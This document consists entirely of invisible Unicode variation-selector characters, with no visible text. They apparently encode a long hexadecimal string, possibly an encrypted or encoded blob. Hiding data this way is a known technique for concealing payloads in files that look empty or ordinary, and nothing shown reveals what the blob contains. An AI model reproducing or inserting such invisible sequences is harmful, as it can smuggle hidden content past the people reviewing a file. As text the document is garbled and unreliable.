󠅖󠄢󠄡󠄣󠅕󠅓󠄢󠅔󠅑󠄣󠅑󠄧󠄥󠄦󠄨󠄩󠅔󠅖󠅔󠅖󠄢󠅒󠄦󠄣󠄠󠅓󠅑󠄣󠅖󠅕󠄦󠅕󠄥󠄢󠅑󠄡󠄩󠄠󠅓󠄦󠅓󠄥󠄦󠄡󠅒󠅓󠄠󠄣󠅒󠅑󠅓󠅖󠅔󠄢󠄩󠅑󠅖󠅖󠄩󠄥󠅕󠄠󠅔󠄦󠄧󠅑󠄢󠄨󠅑󠄧󠅓󠅕󠄦󠄠󠄥󠄡󠄣󠅒󠄢󠄢󠄨󠄥󠅒󠅓󠅒󠅑󠄠󠄠󠅒󠄦󠄥󠅔󠄩󠄠󠄠󠅑󠄥󠅑󠅖󠄠󠄠󠅓󠄦󠄢󠄦󠄢󠄠󠄡󠅔󠄧󠅓󠄩󠄩󠄣󠄨󠄣󠅑󠅑󠄠󠅕󠄤󠅓󠅖󠄣󠄤󠄥󠅒󠅖󠄢󠄤󠄩󠄦󠄣󠅒󠅔󠄢󠄣󠅔󠄩󠄩󠄡󠅒󠄧󠄩󠄠󠄨󠄡󠄢󠄨󠅒󠅕󠄣󠄦󠅒󠄧󠄦󠄡󠄠󠅕󠅑󠄣󠅖󠅑󠅑󠄡󠅖󠄩󠄢󠄤󠄦󠄤󠅔󠅑󠄨󠄢󠅓󠅔󠄡󠄤󠅖󠄥󠄧󠅕󠅔󠄤󠄧󠄨󠄢󠄤󠄥󠄦󠄦󠄠󠅕󠅔󠄤󠅑󠄡󠄢󠅓󠅖󠅔󠅑󠅒󠅑󠅑󠄠󠅔󠄨󠄤󠄤󠅖󠄠󠅓󠅑󠄦󠄥󠄢󠄨󠄡󠄤󠄡󠄨󠄣󠅔󠅖󠄤󠅔󠄥󠄨󠅒󠄡󠅕󠅑󠅒󠄧󠅓󠅕󠄢󠄨󠄥󠅓󠄡󠄠󠅖󠄣󠄢󠅖󠄩󠄥󠅖󠅓󠄨󠄥󠅕󠅔󠅓󠄧󠅓󠄧󠅖󠅕󠅒󠅑󠅔󠄢󠄥󠅕󠄨󠅕󠅕󠄨󠅓󠅒󠄣󠄡󠅑󠄥󠅒󠄧󠄢󠄦󠄧󠅖󠅒󠅓󠅓󠄨󠅕󠄢󠅑󠄡󠄨󠅓󠄨󠄡󠄣󠄤󠄠󠄦󠅒󠄠󠄣󠄥󠄤󠅕󠄥󠄢󠄦󠄨󠅖󠅖󠄤󠄥󠅕󠄠󠄦󠄤󠄥󠅒󠅕󠅖󠄢󠄣󠄣󠄥󠄩󠄣󠄥󠄡󠄤󠄥󠄩󠅒󠄢󠅒󠅕󠄥󠄦󠄨󠅖󠅑󠄡󠅓󠅒󠅒󠄧󠅑󠄣󠅕󠄥󠄩󠄦󠅕󠅕󠄩󠄦󠄢󠅒󠄨󠅓󠄦󠅓󠄩󠅖󠅔󠄠󠅒󠄠󠄩󠅔󠅕󠅓󠅕󠄦󠅓󠄠󠄨󠅖󠄤󠄢󠄣󠄩󠄤󠄩󠅕󠄡󠄣󠄥󠄩󠄡󠅔󠄩󠄩󠄦󠅒󠅑󠅕󠄧󠄨󠅔󠄢󠄢󠅔󠄧󠄦󠄩󠄥󠄦󠄢󠅔󠄥󠅓󠅔󠄥󠄠󠅖󠄩󠄢󠅑󠄨󠄩󠅕󠄣󠄨󠄡󠄥󠅓󠄢󠄩󠄡󠅓󠅕󠄠󠄧󠄦󠄣󠄣󠄡󠄣󠄥󠄡󠄩󠄨󠄦󠄢󠄠󠄢󠅖󠄡󠄤󠅓󠅒󠅑󠄢󠅔󠅒󠄧󠅑󠅔󠄣󠅕󠄦󠄨󠅒󠄨󠄣󠅔󠅑󠅑󠄩󠄢󠄧󠅖󠄥󠄩󠅕󠅕󠅒󠄨󠅔󠄦󠄡󠅔󠄨󠅓󠄢󠄦󠄣󠅖󠅓󠄧󠄡󠄥󠄤󠄢󠄩󠄢󠅖󠄥󠅖󠄥󠄩󠅕󠄦󠅔󠄤󠅕󠅕󠄡󠄤󠄢󠄣󠄧󠅖󠄢󠄩󠄦󠄤󠄠󠄠󠄩󠄡󠄨󠄠󠄦󠅓󠄤󠄡󠅓󠄣󠄥󠄧󠅔󠄠󠅒󠅖󠄤󠄧󠅒󠅔󠄢󠄧󠅑󠄤󠄤󠄨󠅒󠅖󠅕󠄨󠄡󠄢󠅓󠅒󠄡󠄡󠄢󠄢󠅔󠄦󠄠󠅑󠄢󠄧󠅖󠄧󠅖󠅖󠅑󠄢󠅕󠄦󠄣󠅕󠅔󠅑󠄧󠅕󠄨󠅓󠄤󠄠󠄩󠄠󠅔󠅑󠄩󠅔󠄢󠅑󠅓󠅒󠄥󠅑󠄤󠄢󠄦󠄩󠅔󠅑󠄦󠄣󠄠󠄦󠅓󠄣󠄤󠄡󠄢󠅑󠄦󠅒󠄢󠄢󠄥󠄢󠄧󠄣󠅔󠄠󠄡󠄩󠄧󠅕󠅑󠅕󠄦󠅔󠄢󠄥󠄠󠅑󠄩󠅖󠄩󠄧󠄠󠄨󠄢󠄠󠄨󠅕󠅕󠄦󠅔󠄩󠅑󠄣󠄠󠄦󠄥󠄨󠅔󠄣󠅕󠄠󠅓󠄤󠄢󠅓󠄥󠄢󠅓󠄡󠄧󠅑󠄦󠄦󠄣󠅑󠅑󠅔󠅒󠄢󠅑󠅒󠅖󠅓󠄩󠅔󠄢󠅓󠄩󠄨󠄦󠅓󠅒󠅒󠅒󠄧󠅓󠄣󠄤󠅒󠄧󠄣󠄡󠅕󠄠󠅑󠄤󠄤󠄨󠅒󠅒󠄠󠄩󠅒󠅔󠅓󠄣󠄦󠅓󠄩󠄣󠄦󠄢󠄩󠄦󠄠󠄥󠄡󠄩󠅕󠅑󠄨󠄠󠄩󠅔󠄣󠄤󠅕󠄢󠄤󠄤󠄣󠄦󠄥󠅔󠅖󠅖󠄣󠅔󠄦󠅑󠅒󠅖󠅓󠅑󠄣󠄥󠄦󠄤󠄠󠅕󠅖󠄡󠄡󠅕󠄣󠄧󠄦󠅔󠅒󠄨󠅓󠅑󠄨󠅑󠅓󠄨󠄤󠅑󠅑󠄣󠄥󠅖󠄦󠄣󠅕󠄠󠄣󠄤󠅕󠄢󠄤󠄠󠄨󠄨󠄦󠄦󠅑󠄩󠅖󠄠󠄧󠄣󠄤󠄦󠅒󠄣󠄠󠄧󠄡󠄨󠄩󠄡󠄠󠄡󠄠󠄢󠅕󠄥󠅒󠄢󠄣󠅖󠅒󠄣󠄣󠅕󠅑󠄩󠄥󠄩󠅒󠅓󠄧󠅔󠅓󠄦󠅑󠄤󠅓󠄤󠅖󠄧󠅕󠄦󠄠󠄠󠄡󠅖󠅒󠄥󠄧󠄩󠅕󠅔󠄡󠅕󠄠󠅓󠄤󠄠󠅓󠄨󠄦󠄡󠄣󠄧󠅔󠅓󠄤󠄡󠄨󠅔󠄦󠄠󠄧󠅖󠅓󠅑󠄠󠄣󠄥󠄢󠄢󠄨󠄣󠄦󠅔󠅒󠄩󠅑󠄣󠅖󠅔󠅕󠅖󠅒󠅑󠅕󠄢󠄣󠅕󠄩󠄢󠄩󠅔󠄤󠄣󠅔󠄥󠅒󠄧󠅔󠅒󠄥󠅔󠅑󠄥󠄢󠄦󠄤󠅑󠅕󠄦󠅑󠄡󠅖󠄠󠄨󠅑󠅕󠄧󠄧󠄧󠄧󠄦󠄦󠅔󠅑󠅕󠄣󠄦󠅖󠅖󠄣󠅖󠄣󠅖󠅑󠄨󠄠󠄥󠄠󠄥󠄠󠄢󠄤󠅑󠄥󠄡󠄡󠅔󠄥󠅖󠄦󠄦󠅒󠄢󠄠󠄥󠄣󠄨󠄤󠄠󠅔󠄢󠄢󠅖󠄣󠄩󠄥󠅖󠅒󠅑󠄦󠅓󠅓󠄣󠄠󠄣󠄠󠅒󠄡󠄤󠄧󠄧󠅑󠄣󠅓󠅓󠄤󠅑󠄤󠅔󠅔󠅖󠄧󠄤󠄩󠄢󠄥󠅓󠅒󠄠󠄩󠄦󠄦󠄧󠄠󠅑󠄦󠄢󠄡󠄡󠄣󠄧󠄧󠅔󠅔󠄢󠅕󠅔󠅓󠄦󠅕󠄥󠅓󠅒󠄦󠄦󠅑󠄣󠅒󠅕󠅕󠄥󠄨󠄨󠅒󠄡󠅓󠅔󠅕󠄢󠄦󠄤󠅑󠄨󠅕󠄧󠅖󠄡󠅒󠄢󠅖󠄩󠄣󠄠󠄤󠅒󠄡󠄥󠄥󠄠󠄣󠄤󠄧󠄩󠄩󠄨󠄧󠄥󠅕󠄨󠄢󠅑󠅒󠄠󠅒󠄥󠄦󠄨󠄧󠅖󠄢󠄡󠄨󠄠󠅖󠄦󠄧󠄣󠄧󠄨󠄦󠄡󠅒󠄩󠄢󠄧󠄡󠅕󠄦󠄩󠄩󠄠󠄤󠄧󠄤󠄤󠅕󠄩󠅖󠅕󠅓󠄧󠄣󠄦󠄡󠅔󠄣󠅔󠄢󠄣󠅑󠄦󠄣󠄢󠄠󠄥󠄢󠅓󠅓󠄧󠄢󠄢󠅓󠅕󠄢󠄡󠅕󠅔󠄠󠅔󠅒󠄤󠄩󠅓󠄣󠄨󠅒󠄤󠄩󠅓󠅕󠅔󠄥󠅕󠄦󠄤󠅓󠅔󠄠󠄥󠅖󠅖󠄥󠄢󠄦󠄩󠄨󠅑󠄣󠄣󠄤󠅓󠅓󠅖󠄧󠅑󠅓󠅓󠅖󠄧󠄠󠅑󠅔󠄩󠄤󠅕󠅔󠅕󠄦󠅖󠄩󠄩󠅒󠅑󠄢󠄠󠅑󠅑󠅓󠄤󠄥󠅑󠅒󠅓󠄢󠄠󠄧󠄢󠅕󠄨󠅖󠄥󠄣󠅖󠅕󠅔󠅖󠅕󠅕󠅖󠄨󠄤󠅑󠄠󠄤󠅔󠄦󠅑󠄢󠅒󠅓󠄥󠄦󠅑󠄩󠄩󠅓󠄦󠄦󠄥󠅑󠄨󠄥󠄥󠄦󠄨󠄥󠄩󠅔󠄦󠅖󠄠󠅔󠅑󠄢󠄦󠄠󠄥󠄠󠄤󠅒󠅑󠄧󠄩󠅓󠄧󠅒󠄥󠅔󠄥󠄩󠄦󠄥󠅓󠅑󠄨󠄡󠄨󠅖󠄩󠄨󠄤󠅑󠄢󠄢󠄣󠄢󠅔󠄦󠄧󠅒󠅑󠅑󠄩󠄥󠄠󠄥󠄢󠄩󠄠󠄢󠄩󠄨󠄧󠄨󠅑󠅕󠄩󠅓󠅖󠄦󠅓󠄣󠄣󠄤󠄢󠄨󠄦󠅓󠅖󠄤󠅒󠄢󠄦󠅑󠄨󠄠󠄡󠅖󠅔󠄦󠄨󠄡󠄧󠅑󠄠󠄠󠄨󠅖󠅔󠄦󠄦󠄧󠄦󠅔󠅒󠅕󠄦󠅒󠅓󠅑󠅒󠅕󠄥󠄦󠄦󠅒󠅖󠅔󠄦󠄧󠅕󠄧󠄡󠄠󠅒󠄧󠅔󠄠󠅓󠄠󠅔󠄡󠄧󠄠󠄡󠅒󠄥󠄦󠅕󠅖󠄠󠄦󠄧󠄢󠄢󠅑󠄡󠄩󠅖󠅑󠅕󠅔󠅔󠄣󠄢󠅕󠄥󠄨󠄤󠄢󠅕󠄦󠄨󠅖󠄨󠅔󠄥󠄢󠄣󠄦󠅕󠅓󠄠󠄤󠄤󠄤󠅓󠄩󠄡󠅓󠄨󠄣󠅕󠄤󠅖󠄤󠄩󠅖󠄦󠅑󠄣󠅕󠅒󠄢󠅒󠄧󠄩󠅕󠅒󠅑󠄠󠄧󠅒󠄨󠅕󠄦󠄣󠄣󠄨󠄢󠅖󠄡󠄧󠄩󠅓󠅒󠅕󠄦󠅓󠄢󠄤󠅕󠄧󠄡󠄦󠄣󠅕󠅑󠄣󠄦󠄢󠄡󠅔󠄢󠄨󠄥󠅓󠄧󠄥󠄤󠅔󠄢󠄤󠅓󠅑󠄥󠄩󠅒󠄨󠄩󠄤󠅑󠄠󠅕󠄠󠅔󠄠󠄡󠄢󠅓󠅖󠅓󠄤󠅓󠅒󠄤󠄨󠄦󠄥󠅕󠅖󠅑󠄣󠅓󠄣󠅕󠄤󠄤󠅔󠅖󠄢󠄠󠅓󠅔󠄢󠅑󠄢󠅑󠅓󠄨󠄥󠅖󠅖󠅓󠅑󠄤󠄡󠄥󠄢󠅓󠄥󠄨󠅓󠄨󠄥󠄨󠄣󠅒󠄡󠄠󠄥󠅕󠄠󠄧󠄩󠅕󠄧󠄢󠅑󠄡󠅑󠅕󠄨󠅕󠄦󠄡󠅔󠄠󠄡󠄦󠄨󠄥󠄥󠅔󠄡󠅓󠅔󠅔󠄠󠄡󠄧󠅑󠄧󠄢󠄧󠅖󠄡󠄢󠅒󠄢󠄥󠅒󠅖󠄧󠄩󠅑󠄦󠄠󠄧󠄩󠄥󠄢󠄦󠄩󠄡󠄨󠄡󠄣󠄢󠄣󠄨󠄧󠅒󠄢󠄠󠄢󠄦󠄧󠅖󠄣󠄣󠄥󠄤󠄠󠅔󠄥󠄧󠄩󠄣󠄩󠅔󠄡󠄤󠄦󠄥󠄣󠄠󠅕󠄨󠅖󠅑󠄠󠄨󠅖󠄢󠄥󠅑󠅓󠄢󠄡󠄡󠅕󠄩󠄥󠅓󠄨󠄧󠄣󠄧󠅒󠄤󠄠󠄡󠄢󠄥󠅑󠅒󠅖󠄦󠄥󠄦󠅕󠄧󠄩󠄣󠅑󠅑󠅖󠅓󠄣󠄢󠅕󠅑󠄡󠅕󠄤󠄩󠄢󠄦󠅓󠄧󠅑󠄧󠅖󠄨󠄠󠄩󠄧󠄤󠅖󠄠󠄧󠅕󠅒󠄨󠅑󠅑󠄠󠅑󠄣󠅒󠅑󠅓󠅖󠅖󠄧󠄩󠄧󠄦󠄠󠄢󠅒󠄣󠄤󠄤󠅖󠄡󠅒󠄢󠄤󠄣󠄣󠄣󠅔󠄡󠅕󠅔󠄢󠅔󠄡󠅔󠄤󠅕󠄠󠅕󠅒󠄡󠅓󠅓󠄧󠄩󠄦󠄩󠄠󠄥󠅒󠄢󠄧󠅖󠄨󠄩󠅓󠄢󠅕󠄨󠅔󠄥󠅖󠅒󠄦󠄣󠄦󠄢󠄥󠄤󠄣󠄦󠄨󠄨󠄨󠄧󠅔󠅓󠄨󠅑󠄦󠄠󠅔󠅖󠄤󠅔󠄥󠄥󠄢󠄦󠄢󠅖󠅖󠅔󠄤󠅒󠅕󠅔󠅑󠅔󠄧󠄨󠄤󠅑󠄩󠄩󠅕󠅓󠄤󠄣󠄦󠅔󠅓󠅖󠅑󠅖󠄧󠄤󠄠󠄣󠄦󠄩󠄦󠄩󠅒󠄥󠄠󠄣󠄦󠅔󠄩󠅓󠅕󠄨󠄦󠄥󠄣󠄦󠄢󠅒󠄦󠅒󠅕󠅓󠄥󠄢󠅒󠄦󠄤󠅕󠄩󠅒󠄦󠄢󠅔󠄡󠅕󠄡󠄩󠄣󠄢󠄢󠄦󠄩󠅑󠄤󠅒󠅓󠅓󠄦󠄠󠄤󠄥󠅓󠄠󠅕󠅑󠄩󠄢󠅓󠄡󠄣󠄦󠄩󠅔󠅓󠄥󠅒󠅖󠅓󠄤󠅖󠅓󠄡󠅒󠄨󠄨󠅕󠄨󠄢󠄩󠄡󠄤󠄤󠅔󠄣󠅕󠅑󠄡󠅓󠅓󠅖󠅖󠄩󠄠󠄡󠅓󠄤󠅓󠅑󠄦󠄦󠄧󠄦󠄥󠄨󠄥󠅕󠅓󠄦󠄡󠄢󠄩󠅓󠅑󠄧󠄣󠄣󠅖󠅔󠄥󠄦󠄨󠅒󠄠󠅓󠄡󠅖󠄥󠄦󠅒󠅕󠄢󠅒󠅑󠅓󠄣󠅔󠅓󠄢󠄦󠄩󠅕󠄡󠄧󠅒󠄠󠄤󠄢󠅑󠄩󠅖󠅒󠄠󠄩󠄠󠄥󠅑󠄩󠄤󠅓󠅕󠅓󠅔󠅔󠅒󠄢󠄩󠅔󠄣󠄡󠅕󠅓󠅕󠅕󠄠󠄩󠄡󠄦󠅖󠅑󠄤󠅕󠅖󠄢󠅓󠄥󠄧󠅖󠅖󠄩󠅕󠄧󠄠󠄨󠄤󠄥󠄣󠅖󠄥󠄥󠅒󠄢󠅑󠅔󠄥󠄨󠅖󠄩󠄧󠅒󠄨󠅒󠅖󠄤󠄣󠅓󠄤󠅕󠄤󠅒󠄣󠅕󠄣󠅖󠅒󠄨󠅖󠄧󠄧󠅓󠄠󠅒󠅒󠄩󠅖󠄨󠄠󠄤󠄠󠄩󠄨󠄨󠄨󠄨󠅓󠄣󠄦󠄣󠄩󠅓󠄠󠄢󠄦󠅕󠄧󠄦󠅒󠄠󠄠󠅒󠄥󠅔󠄨󠅔󠄣󠅑󠄢󠄦󠅕󠅒󠄤󠄣󠄠󠄣󠄥󠅓󠅑󠄥󠄢󠄡󠄢󠄤󠅕󠅒󠄣󠄠󠄨󠅑󠄡󠅓󠅒󠄡󠅒󠄦󠄤󠄦󠄢󠄦󠄣󠅒󠄦󠄢󠅔󠄡󠄣󠅓󠄥󠄦󠅕󠄡󠄥󠅒󠅕󠄨󠅓󠄧󠅖󠄩󠄦󠅕󠄡󠄧󠅔󠅔󠅖󠄢󠄠󠄨󠅕󠄥󠄤󠅖󠄥󠅒󠅔󠄨󠅒󠄢󠄤󠄨󠄤󠅓󠅔󠄩󠄤󠅑󠅕󠄣󠄤󠄥󠄧󠅒󠄢󠄢󠄢󠄥󠄡󠄡󠄣󠅕󠄠󠅑󠄥󠄥󠅓󠄡󠅒󠅓󠅒󠅕󠄢󠄤󠅕󠄧󠅕󠄠󠅖󠅓󠅓󠄦󠄢󠄦󠄧󠄥󠄡󠄤󠄧󠄤󠄤󠅕󠄣󠄥󠄧󠄡󠄩󠄣󠄣󠅖󠅔󠄢󠄥󠄧󠄣󠄧󠅑󠄡󠄢󠄡󠅕󠅑󠅖󠄨󠄨󠄣󠄣󠄦󠄨󠄣󠄦󠅒󠄣󠄦󠅒󠅒󠄥󠄧󠄠󠄢󠄢󠄣󠅒󠄣󠄨󠄡󠅑󠄦󠄨󠅕󠄠󠄠󠅕󠅒󠄣󠅑󠅖󠄤󠄩󠅒󠄧󠄩󠄧󠅑󠄧󠅑󠅖󠄣󠅑󠄤󠄠󠄤󠅔󠄤󠄤󠅕󠄡󠅓󠄢󠄣󠅕󠅕󠄢󠄥󠅑󠅓󠄤󠅑󠄥󠄦󠄥󠅔󠄣󠄢󠄣󠄥󠄥󠄢󠄤󠅓󠄤󠄢󠄥󠄨󠄦󠄡󠄩󠄠󠄩󠅓󠅖󠅕󠄧󠅒󠄤󠅔󠄤󠅒󠄩󠅑󠄢󠄡󠄩󠄧󠅕󠅑󠄢󠄣󠅕󠄣󠄦󠅖󠄣󠅒󠄧󠄢󠄨󠅑󠄠󠄢󠄧󠄤󠄡󠄧󠄧󠄧󠄦󠄣󠅑󠅕󠄨󠅖󠄦󠄢󠄧󠄨󠄥󠄤󠄥󠄢󠄩󠅑󠅔󠅓󠄥󠅑󠄢󠄨󠄨󠅑󠄨󠅑󠄥󠄧󠄩󠅖󠄨󠄤󠄦󠅑󠄣󠄩󠄧󠄦󠅑󠄨󠄡󠄥󠄡󠄤󠄧󠅑󠅑󠄦󠄧󠅒󠄥󠅑󠅔󠄦󠅖󠅓󠄦󠅕󠅕󠄠󠄨󠅖󠄦󠅔󠅖󠄠󠄡󠄡󠅓󠄠󠄡󠅔󠄡󠅓󠄧󠅔󠅖󠄨󠄥󠅔󠅒󠅖󠅕󠅒󠄤󠄨󠅓󠄨󠄢󠅑󠄦󠅓󠄤󠄣󠄣󠅓󠄣󠄦󠄤󠄩󠅑󠄥󠄤󠄧󠅓󠅔󠄢󠅓󠄤󠅒󠄥󠄢󠄩󠄥󠄠󠄨󠅓󠄧󠄨󠄥󠅓󠄠󠄢󠄤󠅔󠄧󠅓󠅔󠄥󠄠󠄢󠅔󠄦󠅖󠄡󠄦󠄥󠅑󠄤󠅕󠄨󠄩󠅔󠄢󠅓󠄧󠄤󠅔󠄣󠄩󠅕󠄦󠄡󠅔󠄢󠅕󠄢󠅕󠅕󠄠󠅕󠄩󠄩󠄣󠅕󠅖󠄣󠄢󠅕󠅒󠅔󠄡󠅒󠅑󠄣󠅕󠄨󠄠󠅔󠅔󠅑󠄩󠄩󠄣󠅔󠄠󠄩󠅓󠄥󠄢󠄨󠅔󠄥󠄨󠄦󠄡󠄠󠄦󠄠󠄣󠄦󠅕󠄠󠄥󠄨󠅖󠅖󠅖󠄩󠄣󠄧󠄣󠄢󠅑󠄩󠅑󠄣󠄣󠄦󠄤󠄣󠅔󠄩󠅒󠅑󠅑󠅕󠅓󠄠󠅑󠅑󠅑󠅒󠄠󠄥󠅖󠄣󠄡󠄡󠅓󠅖󠅔󠄠󠄨󠄢󠅒󠄠󠄢󠄧󠅔󠄢󠅔󠄥󠄩󠄥󠄢󠅒󠅓󠄡󠄣󠄠󠅒󠅕󠅖󠄥󠅕󠅑󠄨󠅑󠄤󠄠󠄦󠅓󠄠󠄢󠄡󠅓󠅒󠄢󠅒󠄣󠄡󠄧󠄨󠅕󠅓󠅓󠄧󠄠󠄡󠄩󠅔󠅕󠅑󠄢󠄨󠄥󠅕󠅖󠄦󠄡󠄦󠄤󠄦󠄣󠅕󠅕󠅑󠄧󠄦󠅕󠅓󠄦󠅓󠄡󠄩󠄡󠄥󠅖󠄤󠅒󠅓󠅔󠄧󠅒󠄥󠅔󠅒󠄥󠄡󠄥󠄣󠅓󠅔󠅑󠄡󠄦󠅒󠄢󠄢󠅑󠅖󠄣󠄤󠅔󠅖󠅖󠄡󠄥󠅓󠄤󠅕󠅕󠄡󠄧󠄩󠄦󠅑󠅑󠄠󠅑󠅒󠄠󠅒󠄤󠅓󠅖󠄤󠄥󠄦󠄤󠄧󠄣󠅒󠅓󠄩󠄧󠅔󠅕󠄠󠅔󠅕󠄤󠄦󠅕󠄨󠅓󠅔󠄡󠄢󠅕󠅔󠄠󠄦󠄣󠄧󠅑󠄣󠅖󠅖󠅕󠄧󠄩󠅑󠅔󠄥󠅓󠄦󠅑󠅕󠅕󠄨󠅑󠅕󠅑󠄥󠅖󠄥󠄧󠅒󠅒󠄢󠅓󠄨󠄢󠄧󠄤󠄥󠄣󠄣󠄠󠅓󠄦󠄢󠄨󠄧󠄢󠅑󠅖󠄤󠅖󠄢󠄧󠅓󠄩󠅖󠄧󠄢󠅑󠄩󠅒󠄤󠄣󠄠󠅖󠄥󠄤󠄧󠄥󠄧󠄩󠄠󠅓󠄦󠄢󠅔󠄤󠄥󠄠󠅒󠅓󠅑󠄢󠅕󠄤󠄧󠄧󠄦󠄡󠄧󠄦󠅕󠄥󠄤󠅓󠄠󠅓󠅕󠄦󠅒󠅓󠅑󠅒󠄡󠄥󠄧󠅒󠄨󠄥󠄧󠅑󠄠󠅕󠄢󠄧󠄠󠄣󠅔󠄤󠄥󠄠󠅔󠄡󠅕󠄩󠄠󠅕󠅖󠄩󠅑󠅔󠅑󠅔󠄢󠄢󠄥󠄧󠅕󠅓󠄢󠄠󠄢󠅖󠄤󠄠󠅒󠄣󠄠󠄧󠄤󠄡󠄢󠅔󠄢󠄣󠄨󠄦󠅖󠄨󠄠󠅕󠄦󠅑󠄤󠄥󠄤󠄠󠅑󠄨󠄦󠄢󠄩󠄩󠄩󠄧󠅔󠄢󠄡󠅒󠄡󠄤󠅒󠅖󠅖󠅖󠄨󠄨󠄤󠅔󠄦󠄨󠄥󠄥󠄥󠅔󠄦󠄠󠅑󠄠󠄣󠅕󠅓󠅕󠄦󠅓󠄧󠅖󠄡󠄥󠄤󠄥󠅒󠅓󠅓󠄢󠄦󠅑󠅖󠄩󠄡󠄦󠄡󠅔󠄡󠄡󠄥󠅖󠄩󠅕󠄠󠅓󠅓󠄩󠄢󠄦󠄢󠅒󠄡󠄧󠅓󠅒󠄧󠅔󠄥󠅕󠅖󠄧󠅑󠄨󠄧󠄠󠄥󠄨󠅖󠄦󠄣󠄥󠄠󠄣󠅓󠄤󠄥󠅑󠄡󠄥󠄥󠄢󠄤󠄥󠅒󠄨󠅕󠅑󠅔󠄡󠅓󠅓󠄨󠅓󠄩󠄧󠄨󠄥󠄡󠄤󠄥󠅒󠄥󠅓󠄣󠄨󠄦󠄣󠄠󠅒󠄣󠄢󠅑󠅑󠄤󠄤󠄣󠄣󠅒󠅓󠄩󠄩󠅑󠄤󠄤󠄢󠄧󠅑󠄣󠄥󠄩󠄣󠄤󠅕󠅒󠄥󠄥󠅕󠄠󠄣󠄡󠅕󠄩󠄡󠄨󠄤󠅕󠄢󠄥󠅓󠅖󠄧󠅒󠄨󠄣󠄡󠅒󠅑󠄧󠅔󠄣󠅒󠅖󠅒󠄥󠄤󠄢󠅖󠅖󠅑󠅕󠅑󠅔󠅑󠅒󠄥󠄠󠄨󠅑󠄥󠄥󠅖󠄡󠅑󠅔󠅑󠄨󠅕󠅕󠄥󠄧󠄨󠅑󠅓󠅓󠅔󠅓󠅒󠄡󠄢󠄡󠄨󠄠󠄦󠅓󠅖󠄠󠅑󠅑󠄣󠄡󠅓󠄦󠄦󠄩󠄥󠄤󠅓󠄥󠅕󠅒󠄦󠄧󠅓󠄤󠅔󠅓󠅖󠅒󠄨󠄢󠄦󠅓󠄧󠅒󠅖󠅓󠅔󠄦󠄧󠅔󠅑󠄨󠄡󠄧󠄨󠄡󠄣󠄩󠄥󠄧󠄧󠄡󠅑󠄥󠄠󠅒󠄠󠄧󠅒󠄥󠄨󠄧󠄨󠄥󠄠󠄢󠄡󠄩󠄤󠅒󠅔󠄢󠄦󠄢󠅕󠄨󠅕󠅑󠄧󠄡󠄣󠅕󠄥󠅖󠄧󠄧󠅖󠅑󠄥󠄣󠅖󠅔󠅒󠄠󠄡󠄡󠄧󠅔󠅒󠄨󠄤󠅔󠄧󠄥󠅓󠅒󠄨󠄦󠅒󠄧󠅕󠅔󠄤󠄦󠄣󠄥󠄡󠄧󠄩󠅓󠅑󠅑󠅖󠅓󠄤󠅒󠄣󠄩󠅔󠄨󠄨󠄢󠅒󠄡󠄨󠅕󠄦󠄠󠅓󠅖󠄨󠅑󠄡󠄢󠅑󠄠󠄩󠅑󠄩󠄥󠄩󠄢󠅑󠄦󠅔󠄩󠄥󠅒󠄤󠅑󠅔󠄦󠅒󠄢󠄤󠅔󠄠󠅕󠄦󠄦󠅔󠄧󠄤󠅖󠄠󠄢󠅔󠅕󠅓󠅓󠅖󠄣󠄦󠅖󠅕󠄨󠅖󠅖󠅒󠅔󠄦󠄢󠄩󠅖󠅔󠅔󠅕󠄦󠄦󠄣󠄩󠄨󠄩󠅖󠅒󠄣󠄣󠄡󠄣󠅖󠄧󠅖󠅓󠄩󠄠󠄨󠅓󠅑󠅔󠅒󠄡󠄡󠄠󠅖󠄣󠄡󠄠󠄦󠄤󠄩󠅔󠅖󠅒󠅑󠅖󠄦󠄤󠅖󠄢󠅓󠄩󠅔󠄤󠅖󠄦󠄨󠄤󠅖󠅒󠅑󠅑󠄢󠅒󠅕󠅒󠅔󠄦󠅒󠄨󠅔󠄡󠅕󠄡󠄨󠄠󠄢󠄨󠅔󠅒󠅒󠄢󠅖󠅕󠄤󠄠󠄣󠅔󠅑󠄦󠅓󠅖󠄤󠄡󠄦󠄦󠄤󠅒󠅕󠄧󠄡󠄡󠅕󠄩󠄤󠄧󠅑󠅒󠅑󠄤󠄨󠄩󠄡󠅕󠅕󠄤󠄩󠅒󠄦󠅓󠄥󠄣󠅒󠅓󠄧󠅕󠄦󠅓󠅖󠅔󠄧󠄡󠄣󠅔󠄣󠄢󠄨󠄤󠅑󠄣󠄧󠄦󠅔󠄥󠄧󠅔󠄠󠄡󠄦󠄣󠄥󠅑󠄣󠄦󠄧󠄧󠄡󠄠󠄡󠅑󠅕󠄤󠅕󠄥󠅑󠄨󠄩󠄢󠄥󠅓󠄥󠄨󠄢󠄠󠄧󠅕󠅖󠄤󠄡󠅖󠅒󠅖󠄨󠄢󠄨󠄤󠄠󠄩󠅓󠄢󠄢󠅖󠄨󠅔󠄢󠄧󠅒󠄥󠅕󠅒󠄤󠄡󠄩󠄦󠄥󠄤󠄨󠅖󠅓󠅖󠄡󠄠󠅕󠅕󠄠󠄨󠄠󠄦󠄥󠄩󠅕󠄩󠄥󠅑󠄤󠅒󠄩󠄨󠄧󠄦󠅒󠅔󠄦󠅒󠅓󠄥󠄦󠄨󠅒󠅑󠄦󠅖󠅓󠅒󠅔󠄨󠅑󠄩󠅕󠄩󠄨󠅓󠄢󠄢󠄤󠅖󠄣󠅔󠄩󠄣󠄢󠅕󠄤󠅖󠄩󠄣󠄠󠅔󠄡󠄡󠄦󠅑󠄠󠄩󠄢󠄧󠅕󠅓󠄦󠄧󠄩󠄢󠄩󠄠󠅒󠅖󠄧󠄠󠄦󠄢󠄧󠅔󠅓󠅓󠅑󠄩󠄤󠅖󠄨󠄦󠄩󠄦󠄩󠅖󠄩󠅑󠄨󠄦󠄣󠄦󠅔󠄡󠄧󠄧󠅒󠅔󠅑󠄩󠅖󠅑󠅕󠅑󠅒󠅔󠄣󠅕󠄩󠅓󠄥󠅕󠅖󠄧󠄧󠅒󠄠󠄦󠅕󠄢󠄢󠄡󠅕󠅔󠅖󠄦󠅑󠄠󠄥󠅑󠄠󠅔󠄦󠅖󠅖󠄥󠄩󠄢󠅓󠄨󠄤󠅕󠅑󠄣󠅑󠄠󠅖󠅔󠄢󠅔󠅔󠄩󠄣󠄡󠅕󠄢󠄨󠅒󠄦󠄩󠄣󠄦󠄢󠄥󠄣󠄨󠄦󠅔󠅖󠄤󠅓󠄨󠄣󠅔󠅕󠄥󠄤󠅖󠅑󠄤󠄦󠄥󠄠󠄨󠄨󠄣󠅒󠄡󠄦󠄥󠄣󠄠󠄢󠄢󠄢󠄥󠅑